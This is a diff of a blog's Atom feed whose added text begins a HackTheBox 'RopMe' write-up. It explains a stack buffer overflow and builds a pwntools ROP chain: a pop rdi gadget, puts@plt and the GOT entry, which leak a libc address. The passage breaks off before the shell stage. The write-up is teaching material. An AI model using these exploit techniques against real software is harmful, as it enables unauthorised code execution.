@@ -1,7 +1,194 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-12T11:42:45-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-19T05:19:48-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">Hackthebox - RopMe</title><link href="http://localhost:4000/challenges/RopMe/" rel="alternate" type="text/html" title="Hackthebox - RopMe" /><published>2020-09-19T02:14:00-04:00</published><updated>2020-09-19T02:14:00-04:00</updated><id>http://localhost:4000/challenges/RopMe</id><content type="html" xml:base="http://localhost:4000/challenges/RopMe/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Running the binary just asks us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP me outside, how 'about dah?&lt;/code&gt; which hints at &lt;ins&gt;r&lt;/ins&gt;eturn &lt;ins&gt;o&lt;/ins&gt;riented &lt;ins&gt;p&lt;/ins&gt;rogramming (ROP) - redirecting code execution by abusing a buffer overflow vulnerability. And indeed, when hammering the input with a lot of characters we get a seg fault:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ ./ropme
+ROP me outside, how 'about dah?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;looking-into&quot;&gt;Looking into&lt;/h1&gt;
+&lt;p&gt;As always when dealing with binary exploitation we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt; on the file:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ropme 
+ropme: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
+
+kali@kali:~/HTB/challenges/pwn/RopMe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec ropme
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/kali/HTB/challenges/pwn/RopMe/ropme'&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;The first thing we note is it’s a dynamically linked binary, so libraries such as libc are not included in this binary but loaded at runtime at random (base) address. Since we will later want to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; from libc to get a shell we not only need to leak the libc version from the box but also calculate the base address of libc at runtime in order to be able to find the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt; and execute it.&lt;br /&gt; 
+How is calling an external function executed? This is where the &lt;ins&gt;p&lt;/ins&gt;rocedure &lt;ins&gt;l&lt;/ins&gt;inkage &lt;ins&gt;t&lt;/ins&gt;able (PLT) and &lt;ins&gt;g&lt;/ins&gt;lobal &lt;ins&gt;o&lt;/ins&gt;ffset &lt;ins&gt;t&lt;/ins&gt;able (GOT) come into play:&lt;br /&gt;
+Let’s say we want to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;. Calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; will first be translated to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; and the program jumps to the PLT. Looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; we find two jump instructions there, the first will go to the GOT, the second to another function:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;                           &lt;span class=&quot;n&quot;&gt;XREF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0040063&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+  &lt;span class=&quot;mf&quot;&gt;004004e0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;JMP&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+           &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; 
+           &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
+                  &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Override&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CALL_RETURN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COMPUTE&lt;/span&gt;
+  &lt;span class=&quot;mf&quot;&gt;004004e6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;PUSH&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+           &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; 
+           &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
+  &lt;span class=&quot;mo&quot;&gt;004004&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eb&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e0&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;JMP&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;FUN_004004d0&lt;/span&gt;                   &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FUN_004004&lt;/span&gt;
+           &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; 
+           &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;The first time calling puts, the address in libc of puts has not yet been loaded (lazy initialization). Therefore we jump to the function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FUN_004004d0&lt;/code&gt; which finds the address in libc and writes it into the GOT. The second time round we can directly jump to the GOT and to libc (Thanks to &lt;a href=&quot;https://www.youtube.com/watch?v=kUk5pw4w0h4&quot;&gt;LiveOverflow&lt;/a&gt;). This enables us to get an address leak.&lt;br /&gt;
+We also notice, that this is not a &lt;ins&gt;p&lt;/ins&gt;osition &lt;ins&gt;i&lt;/ins&gt;ndependent &lt;ins&gt;e&lt;/ins&gt;xecutable (PIE) which means the program will be loaded at the same location in memory every time and the addresses will thus stay the same.
+Now onto the binary. Looking at the code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghidra&lt;/code&gt;, we see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; reading 500 bytes into a 64 bytes long char, causing the BOF earlier:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_48&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;about dah?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; and attach gdb to analyze the BOF:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline_contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# Sufficiently large byte string
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;# If this pause() has been reached, we run gdb -p $(pidof ropme)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic(0x100, n=8)&lt;/code&gt; creates a 256 bytes long cyclic string consisting of 8 byte long unique substrings. After sending the payload we find the unique substring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x616161616161616a&lt;/code&gt; inside the stack pointer (RSP) register which contains the address that will moved to the instruction pointer and executed next. With the use of pwntools &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic_find&lt;/code&gt; we find out that this string is located after 72 bytes.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/10wxg &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+0x7ffdadd33cd8: 0x616161616161616a
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; cyclic_find&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x616161616161616a, &lt;span class=&quot;nv&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+72
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;To make sure everything works as we now repeat the process but replace our payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b'A'*72 + b'B'*8&lt;/code&gt;. We now find all eight Bs in the RSP. Nice.&lt;/p&gt;
+
+&lt;h1 id=&quot;first-lap---collecting-addresses&quot;&gt;First lap - collecting addresses&lt;/h1&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Big shoutout to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdf&lt;/code&gt; for his writeup on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt;. Since we have the same initial conditions as in the root part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt; we can follow his two-step approach and basically just need to find the right addresses. First we are looking for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; to load the first value of the stack into the rdi register and then return.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; ropme &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;% ?di&quot;&lt;/span&gt;
+&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;0x00000000004006d3: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Now we need to think about what we want to put on the stack that will be moved into the rdi. We need to leak a libc address so why not try leaking the puts address in libc that has been loaded into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT&lt;/code&gt;. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; or searching in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; will hand us the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ objdump -D ropme | grep puts@GLIBC
+4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        # 601018 &amp;lt;puts@GLIBC_2.2.5&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Finally we need the address of the main function to be able to send our second payload.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ objdump -D ropme | grep main
+0000000000400626 &amp;lt;main&amp;gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This leads to a payload of&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4004e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# p64 for 64-bit and correct endianess
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400626&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leaked puts address: 0x%x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So after the junk, we load the address stored in the GOT into the rdi register, return to puts which will leak the address and then return back to the main function of the program.&lt;br /&gt;
+This way we get the libc address leak:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Leaked puts address: 0x7f6e03c4a690
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;second-lap---getting-shell&quot;&gt;Second lap - getting shell&lt;/h1&gt;
+&lt;p&gt;We do not have access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; of the box but we are still able to use the &lt;a href=&quot;https://github.com/niklasb/libc-database&quot;&gt;libc database&lt;/a&gt; with our data leak. Just feeding in the last three digits of the leak will result in two possible libcs:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/opt/libc-database&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./find puts 690
+ubuntu-xenial-amd64-libc6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;libc6_2.23-0ubuntu10_amd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+archive-glibc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;libc6_2.23-0ubuntu11_amd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We go with the first, download it and grab the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;&lt;/p&gt;
